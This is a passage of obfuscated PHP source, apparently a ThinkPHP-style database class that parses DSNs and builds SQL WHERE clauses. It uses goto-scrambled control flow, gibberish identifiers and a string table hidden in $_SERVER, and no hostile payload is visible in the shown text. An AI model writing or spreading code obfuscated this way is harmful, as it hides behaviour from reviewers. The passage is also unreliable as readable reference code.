Aä‘º¬‚¹Ê; D·Ø°¤öß˜: $cÒŒŒäÒöì =& $_SERVER[¬ˆÚÂ”Éğä]; $CŞ–²ÙæÍô = DATA_PATH . $cÒŒŒäÒöì[884]; $ešØ­›øÓ¦ = fopen($CŞ–²ÙæÍô, $cÒŒŒäÒöì[885]); goto a¼ÌÇàÌêŸ; a¼ÌÇàÌêŸ: if (!$ešØ­›øÓ¦) { return !1; } if (flock($ešØ­›øÓ¦, LOCK_EX)) { $B îãšÉÅ = parent::query($bÑÍÛÙù×á); flock($ešØ­›øÓ¦, LOCK_UN); fclose($ešØ­›øÓ¦); return $B îãšÉÅ; } flock($ešØ­›øÓ¦, LOCK_UN); goto a„Üë‚î™¥; Aä‘º¬‚¹Ê: } public function execute($DŞÊ‰™ ¶î) { goto C–Ï‹ÄĞÚ; DĞÊñ¿õçÉ: fclose($Eèê¬íÓ³Ç); show_json($e“ĞÎÓ¦ßÏ[886], !1); return !1; goto f°ŞÇ‹øƒÌ; Aõêá™š§: if (!$Eèê¬íÓ³Ç) { return !1; } if (flock($Eèê¬íÓ³Ç, LOCK_EX)) { $AàšŠÄ–šè = parent::execute($DŞÊ‰™ ¶î); flock($Eèê¬íÓ³Ç, LOCK_UN); fclose($Eèê¬íÓ³Ç); return $AàšŠÄ–šè; } flock($Eèê¬íÓ³Ç, LOCK_UN); goto DĞÊñ¿õçÉ; C–Ï‹ÄĞÚ: $e“ĞÎÓ¦ßÏ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÌä÷›Øë = DATA_PATH . $e“ĞÎÓ¦ßÏ[884]; $Eèê¬íÓ³Ç = fopen($EÌä÷›Øë, $e“ĞÎÓ¦ßÏ[885]); goto Aõêá™š§; f°ŞÇ‹øƒÌ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\145\161" => "\74\76", "\x67\164" => "\76", "\145\x67\164" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\156\157\164\154\x69\153\145" => "\x4e\117\124\40\114\111\113\x45", "\x6c\151\153\x65" => "\114\111\113\105", "\151\x6e" => "\x49\x4e", "\156\x6f\164\151\156" => "\116\x4f\x54\40\111\x4e", "\x6e\x6f\x74\x20\151\156" => "\116\117\x54\x20\x49\116", "\142\145\164\x77\x65\145\156" => "\x42\105\124\x57\105\x45\x4e", "\156\x6f\x74\x62\145\x74\x77\x65\145\156" => "\x4e\117\x54\40\x42\x45\124\x57\x45\105\x4e", "\x6e\x6f\164\40\x62\x65\164\x77\x65\145\156" => "\x4e\117\124\40\x42\105\124\x57\x45\105\x4e"); protected $selectSql = "\123\105\114\x45\103\x54\x25\x44\111\123\124\x49\x4e\103\124\45\40\45\106\x49\105\x4c\x44\45\x20\106\122\117\115\40\45\124\x41\x42\114\x45\45\x25\x4a\117\x49\116\x25\x25\127\x48\x45\122\x45\45\x25\107\122\x4f\x55\x50\45\x25\x48\101\x56\111\116\x47\45\45\x4f\122\x44\105\x52\45\45\114\x49\x4d\111\124\x25\40\x25\125\116\x49\x4f\x4e\45\45\x43\117\115\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $C¶é®ÈÚ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¬ˆÚÂ”Éğä][887], $C¶é®ÈÚ); } public function factory($eó¼¸ÑÖƒ = '') { goto fÑ®…£”ÖÑ; Añ‡³„èĞÌ: return $aˆ÷´ÌË”; goto aİğ„•ÀòÊ; fÑ®…£”ÖÑ: $Dˆ‹–•¸À =& $_SERVER[¬ˆÚÂ”Éğä]; $eó¼¸ÑÖƒ = $this->parseConfig($eó¼¸ÑÖƒ); if (empty($eó¼¸ÑÖƒ[$Dˆ‹–•¸À[888]])) { think_exception(think_lang($Dˆ‹–•¸À[889])); } goto eöá½ÂÒà; eöá½ÂÒà: $this->dbType = ucwords(strtolower($eó¼¸ÑÖƒ[$Dˆ‹–•¸À[888]])); $FäæãŞ¿Â­ = $Dˆ‹–•¸À[890] . $this->dbType; if (class_exists($FäæãŞ¿Â­)) { $aˆ÷´ÌË” = new $FäæãŞ¿Â­($eó¼¸ÑÖƒ); if ($Dˆ‹–•¸À[731] != strtolower($eó¼¸ÑÖƒ[$Dˆ‹–•¸À[888]])) { $aˆ÷´ÌË”->dbType = strtoupper($this->dbType); } else { $aˆ÷´ÌË”->dbType = $this->_getDsnType($eó¼¸ÑÖƒ[$Dˆ‹–•¸À[840]]); } } else { think_exception(think_lang($Dˆ‹–•¸À[891]) . $Dˆ‹–•¸À[892] . $FäæãŞ¿Â­); } goto Añ‡³„èĞÌ; aİğ„•ÀòÊ: } public function __call($b–Ú¯ÈÁµ, $aå·â÷¯) { if (method_exists($this, $b–Ú¯ÈÁµ)) { return call_user_func_array(array($this, $b–Ú¯ÈÁµ), $aå·â÷¯); } } protected function _getDsnType($eƒöåğå·) { $dŠà‚îÌ­Ñ = explode($_SERVER[¬ˆÚÂ”Éğä][4], $eƒöåğå·); $FÅµ£ó‚Æ = strtoupper(trim($dŠà‚îÌ­Ñ[0])); return $FÅµ£ó‚Æ; } private function parseConfig($DæéÔ»‹´ = '') { $BŞùĞ²†à¨ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($DæéÔ»‹´) && is_string($DæéÔ»‹´)) { $DæéÔ»‹´ = $this->parseDSN($DæéÔ»‹´); } elseif (is_array($DæéÔ»‹´)) { $DæéÔ»‹´ = array_change_key_case($DæéÔ»‹´); $DæéÔ»‹´ = array($BŞùĞ²†à¨[888] => $DæéÔ»‹´[$BŞùĞ²†à¨[730]], $BŞùĞ²†à¨[813] => $DæéÔ»‹´[$BŞùĞ²†à¨[893]], $BŞùĞ²†à¨[814] => $DæéÔ»‹´[$BŞùĞ²†à¨[894]], $BŞùĞ²†à¨[811] => $DæéÔ»‹´[$BŞùĞ²†à¨[895]], $BŞùĞ²†à¨[812] => $DæéÔ»‹´[$BŞùĞ²†à¨[896]], $BŞùĞ²†à¨[17] => $DæéÔ»‹´[$BŞùĞ²†à¨[897]], $BŞùĞ²†à¨[840] => $DæéÔ»‹´[$BŞùĞ²†à¨[732]], $BŞùĞ²†à¨[13] => isset($DæéÔ»‹´[$BŞùĞ²†à¨[898]]) ? $DæéÔ»‹´[$BŞùĞ²†à¨[898]] : array()); } elseif (empty($DæéÔ»‹´)) { if (think_config($BŞùĞ²†à¨[899]) && $BŞùĞ²†à¨[731] != strtolower(think_config($BŞùĞ²†à¨[900]))) { $DæéÔ»‹´ = $this->parseDSN(think_config($BŞùĞ²†à¨[899])); } else { $DæéÔ»‹´ = array($BŞùĞ²†à¨[888] => think_config($BŞùĞ²†à¨[900]), $BŞùĞ²†à¨[813] => think_config($BŞùĞ²†à¨[901]), $BŞùĞ²†à¨[814] => think_config($BŞùĞ²†à¨[902]), $BŞùĞ²†à¨[811] => think_config($BŞùĞ²†à¨[903]), $BŞùĞ²†à¨[812] => think_config($BŞùĞ²†à¨[904]), $BŞùĞ²†à¨[17] => think_config($BŞùĞ²†à¨[234]), $BŞùĞ²†à¨[840] => think_config($BŞùĞ²†à¨[899]), $BŞùĞ²†à¨[13] => think_config($BŞùĞ²†à¨[905])); } } return $DæéÔ»‹´; } protected function initConnect($EíÔôÉ…óæ = true) { if (1 == think_config($_SERVER[¬ˆÚÂ”Éğä][18])) { $this->_linkID = $this->multiConnect($EíÔôÉ…óæ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($aŠ›«÷‘Ú™ = false) { $dŒà¦¼˜¦Î =& $_SERVER[¬ˆÚÂ”Éğä]; static $D×Üèù–â = array(); if (empty($D×Üèù–â)) { foreach ($this->config as $fÌ‘ã‹ßÔÊ => $Aßøèš‡«‡) { $D×Üèù–â[$fÌ‘ã‹ßÔÊ] = explode($dŒà¦¼˜¦Î[47], $Aßøèš‡«‡); } } if (think_config($dŒà¦¼˜¦Î[906])) { if ($aŠ›«÷‘Ú™) { $BÅÚ³ÊÛ = floor(mt_rand(0, think_config($dŒà¦¼˜¦Î[907]) - 1)); } else { if (is_numeric(think_config($dŒà¦¼˜¦Î[908]))) { $BÅÚ³ÊÛ = think_config($dŒà¦¼˜¦Î[908]); } else { $BÅÚ³ÊÛ = floor(mt_rand(think_config($dŒà¦¼˜¦Î[907]), count($D×Üèù–â[$dŒà¦¼˜¦Î[811]]) - 1)); } } } else { $BÅÚ³ÊÛ = floor(mt_rand(0, count($D×Üèù–â[$dŒà¦¼˜¦Î[811]]) - 1)); } $dòƒ˜ì‹²† = array($dŒà¦¼˜¦Î[813] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[813]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[813]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[813]][0], $dŒà¦¼˜¦Î[814] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[814]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[814]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[814]][0], $dŒà¦¼˜¦Î[811] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[811]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[811]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[811]][0], $dŒà¦¼˜¦Î[812] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[812]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[812]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[812]][0], $dŒà¦¼˜¦Î[17] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[17]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[17]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[17]][0], $dŒà¦¼˜¦Î[840] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[840]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[840]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[840]][0], $dŒà¦¼˜¦Î[13] => isset($D×Üèù–â[$dŒà¦¼˜¦Î[13]][$BÅÚ³ÊÛ]) ? $D×Üèù–â[$dŒà¦¼˜¦Î[13]][$BÅÚ³ÊÛ] : $D×Üèù–â[$dŒà¦¼˜¦Î[13]][0]); return $this->connect($dòƒ˜ì‹²†, $BÅÚ³ÊÛ); } public function parseDSN($C°ùñ´± ¢) { $c„æÕ×ƒÄ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($C°ùñ´± ¢)) { return !1; } $F„ÊºæÏæî = parse_url($C°ùñ´± ¢); if ($F„ÊºæÏæî[$c„æÕ×ƒÄ[168]]) { $B‚ãË“ÀÉ = array($c„æÕ×ƒÄ[888] => $F„ÊºæÏæî[$c„æÕ×ƒÄ[168]], $c„æÕ×ƒÄ[813] => isset($F„ÊºæÏæî[$c„æÕ×ƒÄ[537]]) ? $F„ÊºæÏæî[$c„æÕ×ƒÄ[537]] : $c„æÕ×ƒÄ[33], $c„æÕ×ƒÄ[814] => isset($F„ÊºæÏæî[$c„æÕ×ƒÄ[909]]) ? $F„ÊºæÏæî[$c„æÕ×ƒÄ[909]] : $c„æÕ×ƒÄ[33], $c„æÕ×ƒÄ[811] => isset($F„ÊºæÏæî[$c„æÕ×ƒÄ[169]]) ? $F„ÊºæÏæî[$c„æÕ×ƒÄ[169]] : $c„æÕ×ƒÄ[33], $c„æÕ×ƒÄ[812] => isset($F„ÊºæÏæî[$c„æÕ×ƒÄ[170]]) ? $F„ÊºæÏæî[$c„æÕ×ƒÄ[170]] : $c„æÕ×ƒÄ[33], $c„æÕ×ƒÄ[17] => isset($F„ÊºæÏæî[$c„æÕ×ƒÄ[75]]) ? substr($F„ÊºæÏæî[$c„æÕ×ƒÄ[75]], 1) : $c„æÕ×ƒÄ[33]); } else { preg_match($c„æÕ×ƒÄ[910], trim($C°ùñ´± ¢), $aŠğË­‚½); $B‚ãË“ÀÉ = array($c„æÕ×ƒÄ[888] => $aŠğË­‚½[1], $c„æÕ×ƒÄ[813] => $aŠğË­‚½[2], $c„æÕ×ƒÄ[814] => $aŠğË­‚½[3], $c„æÕ×ƒÄ[811] => $aŠğË­‚½[4], $c„æÕ×ƒÄ[812] => $aŠğË­‚½[5], $c„æÕ×ƒÄ[17] => $aŠğË­‚½[6]); } $B‚ãË“ÀÉ[$c„æÕ×ƒÄ[840]] = $c„æÕ×ƒÄ[33]; return $B‚ãË“ÀÉ; } protected function debug() { $Ağ®ŸÇÈªğ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ağ®ŸÇÈªğ[911]; if (think_config($Ağ®ŸÇÈªğ[912])) { think_status($Ağ®ŸÇÈªğ[913]); think_trace($this->queryStr . $Ağ®ŸÇÈªğ[914] . think_status($Ağ®ŸÇÈªğ[20], $Ağ®ŸÇÈªğ[913], 6) . $Ağ®ŸÇÈªğ[915], $Ağ®ŸÇÈªğ[33], $Ağ®ŸÇÈªğ[916]); } } protected function parseLock($D¦éÇÇÂ… = false) { $FÏ…®¿ƒ¼£ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$D¦éÇÇÂ…) { return $FÏ…®¿ƒ¼£[33]; } if ($FÏ…®¿ƒ¼£[842] == $this->dbType) { return $FÏ…®¿ƒ¼£[917]; } return $FÏ…®¿ƒ¼£[918]; } protected function parseSet($D¯İŸÁä¨) { $DèäÙ¨•ù¿ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($D¯İŸÁä¨ as $E”‹öğäé => $BÛ¥Œà”Ãé) { if (is_array($BÛ¥Œà”Ãé) && $DèäÙ¨•ù¿[285] == $BÛ¥Œà”Ãé[0]) { $Eñ›çâù¿[] = $this->parseKey($E”‹öğäé) . $DèäÙ¨•ù¿[919] . $BÛ¥Œà”Ãé[1]; } elseif (is_scalar($BÛ¥Œà”Ãé) || is_null($BÛ¥Œà”Ãé)) { $Eñ›çâù¿[] = $this->parseKey($E”‹öğäé) . $DèäÙ¨•ù¿[919] . $this->parseValue($BÛ¥Œà”Ãé); } } return $DèäÙ¨•ù¿[920] . implode($DèäÙ¨•ù¿[47], $Eñ›çâù¿); } protected function bindParam($eŞ‰’µŞÖ, $BÕãİêÃõø) { $this->bind[$_SERVER[¬ˆÚÂ”Éğä][4] . $eŞ‰’µŞÖ] = $BÕãİêÃõø; } protected function parseBind($E©ÉˆÅ¨áÏ) { $E©ÉˆÅ¨áÏ = array_merge($this->bind, $E©ÉˆÅ¨áÏ); $this->bind = array(); return $E©ÉˆÅ¨áÏ; } function parseKey(&$c †›§Ï¹ê, $a–ÚäøËÉ† = true) { if ($a–ÚäøËÉ†) { $c †›§Ï¹ê = $this->parseKeyCheck($c †›§Ï¹ê); } return $c †›§Ï¹ê; } function parseKeyCheck($Eæ‚ÃÂÌ‡†) { $d§®åšá” =& $_SERVER[¬ˆÚÂ”Éğä]; $Eæ‚ÃÂÌ‡† = trim($Eæ‚ÃÂÌ‡†); if (!preg_match($d§®åšá”[921], $Eæ‚ÃÂÌ‡†)) { think_exception($d§®åšá”[922] . $Eæ‚ÃÂÌ‡†); } return $Eæ‚ÃÂÌ‡†; } protected function parseValue($f³×—‚¸²) { $d•Ş…ª³Èô =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_string($f³×—‚¸²)) { $f³×—‚¸² = $d•Ş…ª³Èô[881] . $this->escapeString($f³×—‚¸²) . $d•Ş…ª³Èô[881]; } elseif (isset($f³×—‚¸²[0]) && is_string($f³×—‚¸²[0]) && strtolower($f³×—‚¸²[0]) == $d•Ş…ª³Èô[285]) { $f³×—‚¸² = $this->escapeString($f³×—‚¸²[1]); } elseif (is_array($f³×—‚¸²)) { $f³×—‚¸² = array_map(array($this, $d•Ş…ª³Èô[882]), $f³×—‚¸²); } elseif (is_bool($f³×—‚¸²)) { $f³×—‚¸² = $f³×—‚¸² ? $d•Ş…ª³Èô[83] : $d•Ş…ª³Èô[470]; } elseif (is_null($f³×—‚¸²)) { $f³×—‚¸² = $d•Ş…ª³Èô[99]; } return $f³×—‚¸²; } protected function parseField($AÁŒ¡ÄÃ ™) { $EÀ”½¬¥Š¿ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_string($AÁŒ¡ÄÃ ™) && strpos($AÁŒ¡ÄÃ ™, $EÀ”½¬¥Š¿[47])) { $AÁŒ¡ÄÃ ™ = explode($EÀ”½¬¥Š¿[47], $AÁŒ¡ÄÃ ™); } if (is_array($AÁŒ¡ÄÃ ™)) { $f½ø¢ê›Š = array(); foreach ($AÁŒ¡ÄÃ ™ as $aóµÈ®Ò° => $AÀ’Ùµğè…) { if (!is_numeric($aóµÈ®Ò°)) { $f½ø¢ê›Š[] = $this->parseKey($aóµÈ®Ò°) . $EÀ”½¬¥Š¿[923] . $this->parseKey($AÀ’Ùµğè…); } else { $f½ø¢ê›Š[] = $this->parseKey($AÀ’Ùµğè…); } } $f§ªœÁ¯Å² = implode($EÀ”½¬¥Š¿[47], $f½ø¢ê›Š); } elseif (is_string($AÁŒ¡ÄÃ ™) && !empty($AÁŒ¡ÄÃ ™)) { $f§ªœÁ¯Å² = $AÁŒ¡ÄÃ ™; } else { $f§ªœÁ¯Å² = $EÀ”½¬¥Š¿[176]; } return $f§ªœÁ¯Å²; } protected function parseTable($féè‚Ïä¦œ) { $fÕ…¦×‰†¬ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($féè‚Ïä¦œ)) { $CëÒ•²ì„Ä = array(); foreach ($féè‚Ïä¦œ as $Aºªò‹Å† => $f¹œ§®ğ‡Œ) { if (!is_numeric($Aºªò‹Å†)) { $CëÒ•²ì„Ä[] = $this->parseKey($Aºªò‹Å†) . $fÕ…¦×‰†¬[50] . $this->parseKey($f¹œ§®ğ‡Œ); } else { $CëÒ•²ì„Ä[] = $this->parseKey($Aºªò‹Å†); } } $féè‚Ïä¦œ = $CëÒ•²ì„Ä; } elseif (is_string($féè‚Ïä¦œ)) { if (strstr($féè‚Ïä¦œ, $fÕ…¦×‰†¬[50])) { return $féè‚Ïä¦œ; } $féè‚Ïä¦œ = explode($fÕ…¦×‰†¬[47], $féè‚Ïä¦œ); array_walk($féè‚Ïä¦œ, array($this, $fÕ…¦×‰†¬[830])); } return $fÕ…¦×‰†¬[924] . trim(implode($fÕ…¦×‰†¬[925], $féè‚Ïä¦œ), $fÕ…¦×‰†¬[836]) . $fÕ…¦×‰†¬[924]; } protected function parseWhere($C‡›«ƒ©) { $Bá±÷ã×ŸÙ =& $_SERVER[¬ˆÚÂ”Éğä]; $DˆİœÙ‰Ö‰ = $Bá±÷ã×ŸÙ[33]; if (is_string($C‡›«ƒ©)) { $DˆİœÙ‰Ö‰ = $C‡›«ƒ©; } else { $bŠÛèõó§ = isset($C‡›«ƒ©[$Bá±÷ã×ŸÙ[926]]) ? strtoupper($C‡›«ƒ©[$Bá±÷ã×ŸÙ[926]]) : $Bá±÷ã×ŸÙ[33]; if (in_array($bŠÛèõó§, array($Bá±÷ã×ŸÙ[927], $Bá±÷ã×ŸÙ[928], $Bá±÷ã×ŸÙ[929]))) { $bŠÛèõó§ = $Bá±÷ã×ŸÙ[50] . $bŠÛèõó§ . $Bá±÷ã×ŸÙ[50]; unset($C‡›«ƒ©[$Bá±÷ã×ŸÙ[926]]); } else { $bŠÛèõó§ = $Bá±÷ã×ŸÙ[930]; } foreach ($C‡›«ƒ© as $B†»ƒ…µ‘À => $f·éìä®¡) { $DˆİœÙ‰Ö‰ .= $Bá±÷ã×ŸÙ[265]; if (is_numeric($B†»ƒ…µ‘À)) { $B†»ƒ…µ‘À = $Bá±÷ã×ŸÙ[931]; } if (0 === strpos($B†»ƒ…µ‘À, $Bá±÷ã×ŸÙ[70])) { $DˆİœÙ‰Ö‰ .= $this->parseThinkWhere($B†»ƒ…µ‘À, $f·éìä®¡); } else { if (!preg_match($Bá±÷ã×ŸÙ[932], trim($B†»ƒ…µ‘À))) { think_exception(think_lang($Bá±÷ã×ŸÙ[933]) . $Bá±÷ã×ŸÙ[4] . $B†»ƒ…µ‘À); } $bÀ•§Åæ¥ = is_array($f·éìä®¡) && isset($f·éìä®¡[$Bá±÷ã×ŸÙ[934]]); $B†»ƒ…µ‘À = trim($B†»ƒ…µ‘À); if (strpos($B†»ƒ…µ‘À, $Bá±÷ã×ŸÙ[271])) { $AåíÑÃÔ‰× = explode($Bá±÷ã×ŸÙ[271], $B†»ƒ…µ‘À); $aï¼Š†¸Ş = array(); foreach ($AåíÑÃÔ‰× as $D›–§ÏÂ¦ => $BÊæÖÉèÜ) { $a®»•ÇÁÉ = $bÀ•§Åæ¥ ? $f·éìä®¡[$D›–§ÏÂ¦] : $f·éìä®¡; $aï¼Š†¸Ş[] = $Bá±÷ã×ŸÙ[248] . $this->parseWhereItem($this->parseKey($BÊæÖÉèÜ), $a®»•ÇÁÉ) . $Bá±÷ã×ŸÙ[829]; } $DˆİœÙ‰Ö‰ .= implode($Bá±÷ã×ŸÙ[935], $aï¼Š†¸Ş); } elseif (strpos($B†»ƒ…µ‘À, $Bá±÷ã×ŸÙ[272])) { $AåíÑÃÔ‰× = explode($Bá±÷ã×ŸÙ[272], $B†»ƒ…µ‘À); $aï¼Š†¸Ş = array(); foreach ($AåíÑÃÔ‰× as $D›–§ÏÂ¦ => $BÊæÖÉèÜ) { $a®»•ÇÁÉ = $bÀ•§Åæ¥ ? $f·éìä®¡[$D›–§ÏÂ¦] : $f·éìä®¡; $aï¼Š†¸Ş[] = $Bá±÷ã×ŸÙ[248] . $this->parseWhereItem($this->parseKey($BÊæÖÉèÜ), $a®»•ÇÁÉ) . $Bá±÷ã×ŸÙ[829]; } $DˆİœÙ‰Ö‰ .= implode($Bá±÷ã×ŸÙ[930], $aï¼Š†¸Ş); } else { $DˆİœÙ‰Ö‰ .= $this->parseWhereItem($this->parseKey($B†»ƒ…µ‘À), $f·éìä®¡); } } $DˆİœÙ‰Ö‰ .= $Bá±÷ã×ŸÙ[266] . $bŠÛèõó§; } $DˆİœÙ‰Ö‰ = substr($DˆİœÙ‰Ö‰, 0, -strlen($bŠÛèõó§)); } return empty($DˆİœÙ‰Ö‰) ? $Bá±÷ã×ŸÙ[33] : $Bá±÷ã×ŸÙ[936] . $DˆİœÙ‰Ö‰; } protected function parseWhereItem($bßÑºÃ„Õ, $EÒÚÕğÇ¸à) { $aÙßÆ”—¢¿ =& $_SERVER[¬ˆÚÂ”Éğä]; $c±†×ğí¶¢ = $aÙßÆ”—¢¿[33]; if (is_array($EÒÚÕğÇ¸à)) { if (is_string($EÒÚÕğÇ¸à[0])) { $EÏ¨Ù¥Ôå = strtolower($EÒÚÕğÇ¸à[0]); if (in_array($EÒÚÕğÇ¸à[0], array($aÙßÆ”—¢¿[919], $aÙßÆ”—¢¿[937], $aÙßÆ”—¢¿[938], $aÙßÆ”—¢¿[939], $aÙßÆ”—¢¿[940], $aÙßÆ”—¢¿[941]))) { $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $EÒÚÕğÇ¸à[0] . $aÙßÆ”—¢¿[50] . $this->parseValue($EÒÚÕğÇ¸à[1]); } elseif (preg_match($aÙßÆ”—¢¿[942], $EÒÚÕğÇ¸à[0])) { $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[50] . $this->parseValue($EÒÚÕğÇ¸à[1]); } elseif (preg_match($aÙßÆ”—¢¿[943], $EÒÚÕğÇ¸à[0])) { if (is_array($EÒÚÕğÇ¸à[1])) { $DçÏã±İÓ‚ = isset($EÒÚÕğÇ¸à[2]) ? strtoupper($EÒÚÕğÇ¸à[2]) : $aÙßÆ”—¢¿[928]; if (in_array($DçÏã±İÓ‚, array($aÙßÆ”—¢¿[927], $aÙßÆ”—¢¿[928], $aÙßÆ”—¢¿[929]))) { $c÷®‡Ú•– = array(); foreach ($EÒÚÕğÇ¸à[1] as $CÏŠë›Ğ¤) { $c÷®‡Ú•–[] = $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[50] . $this->parseValue($CÏŠë›Ğ¤); } $c±†×ğí¶¢ .= $aÙßÆ”—¢¿[248] . implode($aÙßÆ”—¢¿[50] . $DçÏã±İÓ‚ . $aÙßÆ”—¢¿[50], $c÷®‡Ú•–) . $aÙßÆ”—¢¿[829]; } } else { $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[50] . $this->parseValue($EÒÚÕğÇ¸à[1]); } } elseif ($aÙßÆ”—¢¿[285] == $EÏ¨Ù¥Ôå) { $c±†×ğí¶¢ .= $aÙßÆ”—¢¿[827] . $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $EÒÚÕğÇ¸à[1] . $aÙßÆ”—¢¿[944]; } elseif (preg_match($aÙßÆ”—¢¿[945], $EÒÚÕğÇ¸à[0])) { if (isset($EÒÚÕğÇ¸à[2]) && $aÙßÆ”—¢¿[285] == $EÒÚÕğÇ¸à[2]) { $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[50] . $EÒÚÕğÇ¸à[1]; } else { if (is_string($EÒÚÕğÇ¸à[1])) { $EÒÚÕğÇ¸à[1] = explode($aÙßÆ”—¢¿[47], $EÒÚÕğÇ¸à[1]); } $D¦Ö™äâ Í = implode($aÙßÆ”—¢¿[47], $this->parseValue($EÒÚÕğÇ¸à[1])); $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[827] . $D¦Ö™äâ Í . $aÙßÆ”—¢¿[829]; } } elseif (preg_match($aÙßÆ”—¢¿[946], $EÒÚÕğÇ¸à[0])) { $Dë¬…Ğèº = is_string($EÒÚÕğÇ¸à[1]) ? explode($aÙßÆ”—¢¿[47], $EÒÚÕğÇ¸à[1]) : $EÒÚÕğÇ¸à[1]; $c±†×ğí¶¢ .= $aÙßÆ”—¢¿[827] . $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $this->exp[$EÏ¨Ù¥Ôå] . $aÙßÆ”—¢¿[50] . $this->parseValue($Dë¬…Ğèº[0]) . $aÙßÆ”—¢¿[930] . $this->parseValue($Dë¬…Ğèº[1]) . $aÙßÆ”—¢¿[266]; } else { think_exception(think_lang($aÙßÆ”—¢¿[933]) . $aÙßÆ”—¢¿[4] . $EÒÚÕğÇ¸à[0]); } } else { $Bé½á¢‹¹ = count($EÒÚÕğÇ¸à); $aÑßÜ®Š½Ø = isset($EÒÚÕğÇ¸à[$Bé½á¢‹¹ - 1]) ? strtoupper($EÒÚÕğÇ¸à[$Bé½á¢‹¹ - 1]) : $aÙßÆ”—¢¿[33]; if (in_array($aÑßÜ®Š½Ø, array($aÙßÆ”—¢¿[927], $aÙßÆ”—¢¿[928], $aÙßÆ”—¢¿[929]))) { $Bé½á¢‹¹ = $Bé½á¢‹¹ - 1; } else { $aÑßÜ®Š½Ø = $aÙßÆ”—¢¿[927]; } for ($bî¤©‰¡Û‰ = 0; $bî¤©‰¡Û‰ < $Bé½á¢‹¹; $bî¤©‰¡Û‰++) { $Dë¬…Ğèº = is_array($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰]) ? $EÒÚÕğÇ¸à[$bî¤©‰¡Û‰][1] : $EÒÚÕğÇ¸à[$bî¤©‰¡Û‰]; if ($aÙßÆ”—¢¿[285] == strtolower($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰][0])) { $c±†×ğí¶¢ .= $aÙßÆ”—¢¿[248] . $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $Dë¬…Ğèº . $aÙßÆ”—¢¿[944] . $aÑßÜ®Š½Ø . $aÙßÆ”—¢¿[50]; } else { $B¬²Ö°³¿ = is_array($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰]) ? $this->exp[strtolower($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰][0])] : $aÙßÆ”—¢¿[919]; if (!$B¬²Ö°³¿ && is_array($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰]) && in_array($EÒÚÕğÇ¸à[$bî¤©‰¡Û‰][0], array($aÙßÆ”—¢¿[919], $aÙßÆ”—¢¿[937], $aÙßÆ”—¢¿[938], $aÙßÆ”—¢¿[939], $aÙßÆ”—¢¿[940], $aÙßÆ”—¢¿[941]))) { $B¬²Ö°³¿ = $EÒÚÕğÇ¸à[$bî¤©‰¡Û‰][0]; } $c±†×ğí¶¢ .= $aÙßÆ”—¢¿[248] . $bßÑºÃ„Õ . $aÙßÆ”—¢¿[50] . $B¬²Ö°³¿ . $aÙßÆ”—¢¿[50] . $this->parseValue($Dë¬…Ğèº) . $aÙßÆ”—¢¿[944] . $aÑßÜ®Š½Ø . $aÙßÆ”—¢¿[50]; } } $c±†×ğí¶¢ = 